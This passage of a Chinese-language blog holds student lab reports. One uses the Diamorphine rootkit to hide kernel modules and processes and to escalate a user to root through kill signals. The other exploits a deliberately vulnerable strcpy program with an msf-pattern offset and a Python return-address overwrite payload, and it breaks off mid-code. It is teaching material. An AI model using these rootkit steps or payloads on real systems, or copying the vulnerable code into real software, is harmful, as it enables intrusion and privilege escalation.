<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> Diamorphine</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%88%86%E5%B1%82%E8%AE%BE%E8%AE%A1%E4%B8%8ERootkit%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%AE%9E%E7%8E%B0/image-20241120235341910.png" class="" title="image-20241120235341910">
<p>如果缺少与当前内核匹配的头文件和构建工具，运行以下命令：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo yum groupinstall <span class="string">&quot;Development Tools&quot;</span> -y</span><br><span class="line">sudo yum install kernel-devel-$(<span class="built_in">uname</span> -r) kernel-headers-$(<span class="built_in">uname</span> -r) -y</span><br><span class="line"><span class="built_in">ls</span> -l /lib/modules/$(<span class="built_in">uname</span> -r)/build</span><br></pre></td></tr></table></figure>
<p><strong>(3) 加载内核模块（as root）</strong></p>
<p>将编译后的模块加载到内核中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod diamorphine.ko</span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%88%86%E5%B1%82%E8%AE%BE%E8%AE%A1%E4%B8%8ERootkit%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%AE%9E%E7%8E%B0/image-20241120235601703.png" class="" title="image-20241120235601703">
<h5 id="2-内核模块隐藏验证"><a href="#2-内核模块隐藏验证" class="headerlink" title="2. 内核模块隐藏验证"></a>2. 内核模块隐藏验证</h5><p><strong>(1) 验证内核模块是否隐藏</strong></p>
<p>使用 <code>lsmod</code> 命令列出当前加载的所有内核模块，检查是否能看到 Diamorphine 模块：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsmod</span><br></pre></td></tr></table></figure>
<p>由于 Diamorphine 模块具有隐藏功能，此时不会显示在列表中。</p>
<img src="/2024/11/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%88%86%E5%B1%82%E8%AE%BE%E8%AE%A1%E4%B8%8ERootkit%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%AE%9E%E7%8E%B0/image-20241120235621070.png" class="" title="image-20241120235621070">
<p><strong>(2) 显示隐藏的模块</strong></p>
<p>要显示被隐藏的 Diamorphine 模块，可以发送 <code>kill -63</code> 信号：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -63 0</span><br></pre></td></tr></table></figure>
<p>再次运行 <code>lsmod</code>，可以看到 Diamorphine 模块显示在列表中。</p>
<img src="/2024/11/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%88%86%E5%B1%82%E8%AE%BE%E8%AE%A1%E4%B8%8ERootkit%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%AE%9E%E7%8E%B0/image-20241120235825156.png" class="" title="image-20241120235825156">
<h5 id="3-隐藏用户态进程"><a href="#3-隐藏用户态进程" class="headerlink" title="3. 隐藏用户态进程"></a>3. 隐藏用户态进程</h5><p><strong>(1) 创建一个虚拟进程</strong></p>
<p>通过运行以下命令创建一个虚拟进程：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> 1000 &amp;</span><br><span class="line">ps -ef | grep <span class="built_in">sleep</span></span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%88%86%E5%B1%82%E8%AE%BE%E8%AE%A1%E4%B8%8ERootkit%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%AE%9E%E7%8E%B0/image-20241120235853141.png" class="" title="image-20241120235853141">
<p><strong>(2) 隐藏进程</strong></p>
<p>要隐藏进程，可以使用 <code>kill -31</code> 命令，指定需要隐藏的进程 ID：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -31 &lt;pid&gt;</span><br></pre></td></tr></table></figure>
<p>运行 <code>ps</code> 命令查看，进程将不再显示。</p>
<img src="/2024/11/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%88%86%E5%B1%82%E8%AE%BE%E8%AE%A1%E4%B8%8ERootkit%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%AE%9E%E7%8E%B0/image-20241121000034264.png" class="" title="image-20241121000034264">
<p><strong>(3) 取消隐藏进程</strong></p>
<p>使用相同的 <code>kill -31</code> 命令来取消隐藏该进程：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -31 &lt;pid&gt;</span><br></pre></td></tr></table></figure>
<p>此时再次运行 <code>ps</code> 命令，可以看到该进程重新显示。</p>
<img src="/2024/11/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%88%86%E5%B1%82%E8%AE%BE%E8%AE%A1%E4%B8%8ERootkit%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%AE%9E%E7%8E%B0/image-20241121000059934.png" class="" title="image-20241121000059934">
<h5 id="4-普通用户提权至-root"><a href="#4-普通用户提权至-root" class="headerlink" title="4. 普通用户提权至 root"></a>4. 普通用户提权至 root</h5><p><strong>(1) 切换至普通用户并查看权限</strong></p>
<p>首先，切换到普通用户，例如 <code>moyuan</code>，并查看当前用户权限：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su - moyuan</span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
<p>默认情况下，普通用户是没有 root 权限的。</p>
<img src="/2024/11/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%88%86%E5%B1%82%E8%AE%BE%E8%AE%A1%E4%B8%8ERootkit%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%AE%9E%E7%8E%B0/image-20241121000220194.png" class="" title="image-20241121000220194">
<p><strong>(2) 提权至 root</strong></p>
<p>使用 Diamorphine 的 <code>kill -64</code> 信号来为普通用户授予 root 权限：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -64 0</span><br></pre></td></tr></table></figure>
<p>执行上述命令后，再次运行 <code>whoami</code> 命令，结果将显示用户已被提升为 root。</p>
<img src="/2024/11/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%88%86%E5%B1%82%E8%AE%BE%E8%AE%A1%E4%B8%8ERootkit%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%AE%9E%E7%8E%B0/image-20241121000304532.png" class="" title="image-20241121000304532">
<h5 id="5-实验结果"><a href="#5-实验结果" class="headerlink" title="5. 实验结果"></a>5. 实验结果</h5><ul>
<li><strong>实验结果</strong>: 通过 Diamorphine 工具，成功实现了内核模块和用户态进程的隐藏，以及普通用户提权至 root 的操作。</li>
<li><strong>总结</strong>: 本次实验演示了 🐛 Rootkit 工具的强大功能，包括隐藏内核模块、隐藏用户进程以及普通用户提权等。在安全研究中，这些功能展示了如何在获得系统最高权限后维持控制权。但也要意识到，这类工具滥用可能对系统安全构成巨大威胁。</li>
</ul>
<h5 id="6-注意事项与学习体会"><a href="#6-注意事项与学习体会" class="headerlink" title="6. 注意事项与学习体会"></a>6. 注意事项与学习体会</h5><ul>
<li><strong>🛠️ 工具的使用应与原理结合</strong>: 在学习过程中，理解工具背后的工作原理尤为重要，只有如此才能做到举一反三。</li>
<li><strong>⚠️ 保持警惕与责任感</strong>: 🐛 Rootkit 等工具在安全领域有其研究价值，但使用时需保持审慎，确保不会对他人或公共系统造成不良影响。</li>
<li><strong>📈 工具不断更新</strong>: 安全工具和技术不断更新，掌握基础原理并善于总结经验，是保持技术先进性的关键。</li>
</ul>
<p>通过本次实验，我对 🐛 Rootkit 的原理及其在 🐧 Linux 系统中的应用有了更深的理解，也更深刻地认识到了系统安全的重要性。</p>
<h4 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h4><ol>
<li><p><strong>实验收获</strong>：</p>
<ul>
<li>理解了 💻 计算机系统分层设计的理念及应用。</li>
<li>掌握了 🐛 Rootkit 的定义、分类及应用场景。</li>
<li>通过实践学习了 🐧 Linux 内核模块的开发流程，初步实现了一个简单 🐛 Rootkit。</li>
</ul>
</li>
<li><p><strong>注意事项</strong>：</p>
<ul>
<li>🐛 Rootkit 开发涉及较高权限操作，存在风险，请勿用于非法用途。</li>
<li>在实际环境中使用内核模块时，应充分测试以避免系统崩溃。</li>
</ul>
</li>
<li><p><strong>未来改进</strong>：</p>
<ul>
<li>学习更多高级劫持技术，如虚拟📁文件系统劫持。</li>
<li>研究 🐛 Rootkit 的检测和防御方法，增强系统🛡️安全性。</li>
</ul>
</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/" class="post-title-link" itemprop="url">实验报告：缓冲区溢出攻击的实现过程</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-11-21 14:18:57 / 修改时间：14:22:58" itemprop="dateCreated datePublished" datetime="2024-11-21T14:18:57+08:00">2024-11-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="实验报告：缓冲区溢出攻击的实现过程"><a href="#实验报告：缓冲区溢出攻击的实现过程" class="headerlink" title="实验报告：缓冲区溢出攻击的实现过程"></a>实验报告：缓冲区溢出攻击的实现过程</h2><p>本实验旨在演示缓冲区溢出（Buffer Overflow）攻击的基本过程，包括构造漏洞程序、寻找跳板地址、构造并注入Shellcode来实现控制流劫持。</p>
<h3 id="1-实验目标"><a href="#1-实验目标" class="headerlink" title="1. 实验目标"></a>1. 实验目标</h3><p>缓冲区溢出（Buffer Overflow）是指程序在写入数据到内存缓冲区时，超出了预分配的空间，从而覆盖相邻的内存数据。此漏洞主要出现在不安全的函数（如 <code>strcpy</code> 等）中，允许攻击者在内存中任意写入数据。通过控制写入数据的内容，攻击者可覆盖程序的返回地址、函数指针等关键变量，进而实现恶意代码的执行。</p>
<ul>
<li><strong>栈溢出</strong>：溢出缓冲区位于栈上，覆盖返回地址，改变控制流。</li>
<li><strong>堆溢出</strong>：溢出缓冲区位于堆上，通常通过修改函数指针或内存管理数据结构来实现。</li>
</ul>
<p>通过缓冲区溢出漏洞，修改程序返回地址，实现自定义代码的执行。同时，演示如何在 Windows 和 Linux 环境下利用缓冲区溢出，最终实现计算机病毒的传播。</p>
<p><strong>实验环境</strong></p>
<ul>
<li>操作系统：Ubuntu 22.04 / Windows 10</li>
<li>编译器：<code>gcc</code> (Linux)、<code>Dev C++</code> (Windows)</li>
<li>调试工具：<code>GDB</code> (Linux)、<code>x32dbg</code> (Windows)、IDA</li>
<li>编程语言：C、Python</li>
<li>关键库：<code>pwn</code>、<code>pwntools</code></li>
</ul>
<h3 id="2-实验步骤"><a href="#2-实验步骤" class="headerlink" title="2. 实验步骤"></a>2. 实验步骤</h3><h4 id="（一）Windows-栈溢出示例"><a href="#（一）Windows-栈溢出示例" class="headerlink" title="（一）Windows 栈溢出示例"></a>（一）Windows 栈溢出示例</h4><p>实验目标为利用缓冲区溢出修改返回地址，触发特定功能（如显示消息框）。</p>
<p><strong>构造一个存在缓冲区溢出漏洞的程序</strong></p>
<p>首先编写一个简单的程序，通过<code>strcpy</code>函数将输入数据复制到缓冲区内。由于未检查输入数据的长度，若输入的数据超过缓冲区大小，则会导致缓冲区溢出。</p>
<p><strong>代码示例</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  <span class="comment">// 包含 strcmp 和 strcpy 函数的声明</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>  <span class="comment">// 包含 exit 函数的声明</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span>  <span class="comment">// 定义正确的密码为 &quot;1234567&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证密码函数，接受输入的 password 字符串</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span> <span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> authenticated;  <span class="comment">// 用于存储比较结果的变量</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">8</span>];  <span class="comment">// 定义了一个 8 字节的缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比较输入的密码和预定义的密码是否相同</span></span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password, PASSWORD);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将输入的 password 复制到 buffer 中，但没有检查长度，可能导致溢出</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, password);  <span class="comment">// 注意：潜在的缓冲区溢出漏洞</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> authenticated;  <span class="comment">// 返回比较结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> valid_flag = <span class="number">0</span>;  <span class="comment">// 标志密码是否正确</span></span><br><span class="line">    <span class="type">char</span> password[<span class="number">8</span>];  <span class="comment">// 定义了一个缓冲区用于存储输入的密码</span></span><br><span class="line">    FILE *fp;  <span class="comment">// 文件指针，用于打开和读取 password.txt 文件</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开 password.txt 文件，若失败则退出程序</span></span><br><span class="line">    <span class="keyword">if</span> (!(fp = fopen(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;rw+&quot;</span>))) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从文件中读取密码字符串并存储到 password 缓冲区中</span></span><br><span class="line">    <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 verify_password 函数验证密码是否正确</span></span><br><span class="line">    valid_flag = verify_password(password);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据 valid_flag 判断密码是否正确</span></span><br><span class="line">    <span class="keyword">if</span> (valid_flag)  <span class="comment">// 如果 valid_flag 非零（表示密码不正确）</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>  <span class="comment">// 如果 valid_flag 为零（表示密码正确）</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭文件</span></span><br><span class="line">    fclose(fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待用户输入以暂停程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Press Enter to continue...&quot;</span>);</span><br><span class="line">    getchar();  <span class="comment">// 在程序结束前等待用户按 Enter 键</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上述代码中，<code>buffer</code>只有8字节，但<code>strcpy</code>并未限制<code>password</code>的长度。如果输入数据超过8字节，将导致<code>buffer</code>后的数据被覆盖，包括返回地址。</p>
<ol>
<li><p><strong>编译程序</strong>：将上述代码编译为可执行文件。</p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241114164528351.png" class="" title="image-20241114164528351">
</li>
<li><p><strong>构造输入</strong>：在<code>password.txt</code>中输入超过8字节的内容，以覆盖返回地址并修改程序执行流。</p>
</li>
</ol>
<p>在txt文件输入100个A观察缓冲区</p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241114165501715.png" class="" title="image-20241114165501715">
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241114165405248.png" class="" title="image-20241114165405248">
<p>使用<code>msf-pattern_create -l 100</code>计算大小</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(student㉿kali)-[~]</span><br><span class="line">└─$ msf-pattern_create -l 100</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241114165643402.png" class="" title="image-20241114165643402">
<p>重新在<code>X32dbg</code>运行，执行到第一次报错，记录下EIP地址<code>41386141</code></p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241114165844110.png" class="" title="image-20241114165844110">
<p>计算缓冲区大小（即红色框的区域）</p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/e0712574e36420659ee928ea9c931c5.png" class="" title="e0712574e36420659ee928ea9c931c5">
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/1563440952253-d85218ab-380b-480f-bfff-dd21f1014cad.webp" class="" title="img">
<p>使用命令<code>msf-pattern_offset -l 100 -q 41386141</code>得知缓冲区大小为24字节</p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241114170207767.png" class="" title="image-20241114170207767">
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241114192008578.png" class="" title="image-20241114192008578">
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241114192028350.png" class="" title="image-20241114192028350">
<p>将ret改为004014C5</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">padding = <span class="string">b&quot;A&quot;</span> * <span class="number">24</span>  <span class="comment"># 用 &quot;A&quot; 填充 24 字节</span></span><br><span class="line">return_address = <span class="string">b&quot;\xC5\x14\x40\x00&quot;</span>  <span class="comment"># secret_function 的地址（假设为 0x00401410）</span></span><br><span class="line">payload = padding + return_address</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 payload 写入 password.txt 文件，使用二进制写入模式</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>重新运行，成功实现了<code>Congratulation! You have passed the verification!</code></p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241114192419666.png" class="" title="image-20241114192419666">
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115031108202.png" class="" title="image-20241115031108202">
<p>接下来试着用它弹一个窗，要对源码做一下改变以便能够调用 Messagebox 函数，因此导入了 user32.dll</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;    // 包含标准输入输出函数的声明</span></span><br><span class="line"><span class="comment">#include &lt;windows.h&gt;  // 包含 Windows API 函数的声明</span></span><br><span class="line"><span class="comment">#define PASSWORD &quot;1234567&quot;  // 定义正确的密码常量为 &quot;1234567&quot;</span></span><br><span class="line"></span><br><span class="line">// 验证密码的函数，接收一个字符指针 password</span><br><span class="line"><span class="built_in">int</span> verify_password(char *password)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> authenticated;         // 变量 authenticated，用于存储密码验证结果</span><br><span class="line">    char buffer[<span class="number">44</span>];           // 定义一个大小为 <span class="number">44</span> 字节的缓冲区 buffer</span><br><span class="line"></span><br><span class="line">    // 使用 strcmp 比较输入的 password 与预定义的 PASSWORD 是否一致</span><br><span class="line">    // 如果一致则返回 <span class="number">0</span>，不一致返回非零值</span><br><span class="line">    authenticated = strcmp(password, PASSWORD);</span><br><span class="line"></span><br><span class="line">    // 将输入的 password 复制到 buffer 中，使用了 strcpy 函数</span><br><span class="line">    // strcpy 不会检查目标缓冲区的大小，存在潜在的缓冲区溢出漏洞</span><br><span class="line">    strcpy(buffer, password);  // 这里可能导致溢出，覆盖后续的内存区域</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> authenticated;      // 返回比较结果</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> valid_flag = <span class="number">0</span>;        // 用于存储密码验证的标志，<span class="number">0</span> 表示正确，非零表示错误</span><br><span class="line">    char password[<span class="number">44</span>];       // 定义一个字符数组用于存储从文件读取的密码，大小为 <span class="number">1024</span> 字节</span><br><span class="line">    FILE *fp;                  // 文件指针，用于操作文件</span><br><span class="line"></span><br><span class="line">    // 加载 <span class="string">&quot;user32.dll&quot;</span> 库</span><br><span class="line">    // 在实际操作中，这一行代码在当前示例中没有实际意义，但可能用于其他操作</span><br><span class="line">    LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span 